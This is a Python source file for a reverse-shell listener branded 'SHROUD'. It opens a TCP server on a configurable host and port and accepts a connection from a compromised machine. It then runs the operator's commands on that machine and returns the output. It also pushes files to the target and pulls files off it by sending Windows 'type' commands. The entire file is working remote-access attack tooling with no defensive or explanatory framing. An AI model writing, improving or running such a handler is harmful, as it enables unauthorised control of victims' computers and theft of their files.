import socket
import sys
banner = '''
                ╭━━━━━━━━━━━━━━━━━━━━━━━━━━╮
              ┃  ╭━━━┳╮     ╭┳━━━┳━━━┳╮     ╭┳━━━╮   ┃
            ┃  ┃╭━╮┃┃     ┃┃╭━╮┃╭━╮┃┃     ┃┣╮╭╮┃   ┃
          ┃  ┃╰━━┫╰━╯┃╰━╯┃┃     ┃┃┃     ┃┃┃┃┃┃   ┃
        ┃  ╰━━╮┃╭━╮┃╭╮╭┫┃     ┃┃┃     ┃┃┃┃┃┃   ┃
      ┃  ┃╰━╯┃┃     ┃┃┃┃╰┫╰━╯┃╰━╯┣╯╰╯┃   ┃
    ┃  ╰━━━┻╯     ╰┻╯╰━┻━━━┻━━━┻━━━╯   ┃
  ┃                                 ~~| WELCOME  IN SHROUD |~~                                ┃
╰━━━━━━━━━━━━━━━━━━━━━━━━━━╯
'''
banner2 = '''
              ╔═══════════════════════╗
            ║      / /\ \                                                                                                  ║
          ║     / /      \ \                                                                                             ║
        ║    / /==.== \ \                                                                                        ║                                    
      ║   / /=======\ \                      BOOM...                                            ║
    ║   / /                      \ \      /\                                                                     ║
  ║  / /                           \ \    \/                                                                   ║
╚═══════════════════════╝
'''
banner3 ='''
▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
   ▄████████    ▄█    █▄       ▄████████  ▄██████▄  ███    █▄  ████████▄  
  ███    ███   ███    ███     ███    ███ ███    ███ ███    ███ ███   ▀███ 
  ███    █▀    ███    ███     ███    ███ ███    ███ ███    ███ ███    ███ 
  ███         ▄███▄▄▄▄███▄▄  ▄███▄▄▄▄██▀ ███    ███ ███    ███ ███    ███ 
▀███████████ ▀▀███▀▀▀▀███▀  ▀▀███▀▀▀▀▀   ███    ███ ███    ███ ███    ███ 
         ███   ███    ███   ▀███████████ ███    ███ ███    ███ ███    ███ 
   ▄█    ███   ███    ███     ███    ███ ███    ███ ███    ███ ███   ▄███ 
 ▄████████▀    ███    █▀      ███    ███  ▀██████▀  ████████▀  ████████▀  
                              ███    ███
▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
'''
print(banner3)
lhost="0.0.0.0"
lport=8080
tab = ' '
mark1 = ' ╰━━>'
mark2 = '~@@>'
mark = ' █▄▄▄ '
line = (' ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄')
print(len(line))
print(line[:28]+'ROOT'+line[32:])     
while 1:
     try:
          while 1:
               mcmd = str(input(mark))
               if mcmd == 'set lhost':
                         lhost = input(f' █{tab}{mark}')
               elif mcmd == 'set lport':
                         lport = int(input(f' █{tab}{mark}'))
               elif mcmd =='lhost':
                    print(f' █{tab}{mark}{lhost} ')
               elif mcmd == 'lport':
                    print(f' █{tab}{mark}{lport}')
               elif mcmd == 'help' or mcmd =='?':
                    print(f' █{tab}{mark} set lhost - To set Local Host or Set IP of Local Computer.\n █{tab}{mark} set lport - To Set Local Listening Port Of Your Computer.\n █{tab}{mark} lhost = to show current lhost. \n █{tab}{mark}lport - To.Show Current lport')
               elif mcmd =='connect':
                    print(' █'+line[2:])
                    print('')
                    print(line[:27]+'CONNECTION'+line[37:])
                    print(f'{mark}[*]Starting Servers on {lhost}  ,{lport}...')
                    break
               elif mcmd =='exit':
                    sys.exit()
          s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
          s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
          s.bind((lhost,lport))
          s.listen(1)
          conn,addr=s.accept()
          print(f'{mark}[*]Connected to : ',addr,'.....')
          print(' █ '+line[1:])
          while True:
               command=input(" ▄*")
               if command=='exit':
                    conn.send(b'exit')
                    conn.close()
                    print(line[:28]+'ROOT'+line[32:])
                    break
               elif command =='' or command in '                                       ':
                    pass
               elif command =='upload':
                    conn.send(command.encode())
                    conn.send((input('FILE PATH WITH NAME (*For Target *) : ')).encode())
                    conn.send(str(input('FILE SIZE: ')).encode())
                    with open(input('File U send ?  '),'rb') as f:
                         file_data = f.read()
                    conn.send(file_data)
                    print('UPLOADED....')
               elif command =='download':
                    file_name=input('FILE_PATH: ')
                    command = 'type '+file_name
                    conn.send(command.encode())
                    file_size = int(input('FILE SIZE IN KB: '))*1024
                    data = conn.recv(file_size+10)
                    with open(input('filename: '),'wb') as f:
                         f.write(data)
               else:
                    conn.send(command.encode())
                    output=conn.recv(10000)
                    output= output.decode()
                    print(output)
     except Exception as e:
          print(e)
          continue
